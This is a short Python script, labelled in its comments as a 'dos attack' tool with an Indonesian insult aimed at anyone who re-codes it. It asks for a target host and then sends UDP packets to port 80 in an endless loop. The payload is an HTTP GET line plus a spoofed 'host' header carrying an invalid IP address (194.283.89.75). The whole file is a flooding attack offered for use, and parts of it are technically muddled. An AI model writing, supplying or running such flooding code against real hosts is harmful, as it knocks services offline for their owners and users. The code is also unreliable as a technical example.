#dos attack
#jangan di recode ya anak bangsat
from socket import *
from asyncio import run
from pyfiglet import figlet_format

async def dos(HOST: str,PORT: int) -> None:
    with socket(AF_INET,SOCK_DGRAM) as flood:
        dest=(HOST,PORT)
        packet=b"GET / HTTP/1.1\r\n\r\n"
        proxy=b"host: 194.283.89.75\r\n"
        while (True):
            flood.sendto(packet,dest)
            flood.sendto(proxy,dest)
            print(f"packet dikirimkan ke {dest[0]}")

if __name__ == "__main__":
   print(figlet_format("DOS",font="larry3d"))
   target = input("target host: ")
   run(dos(target,80))
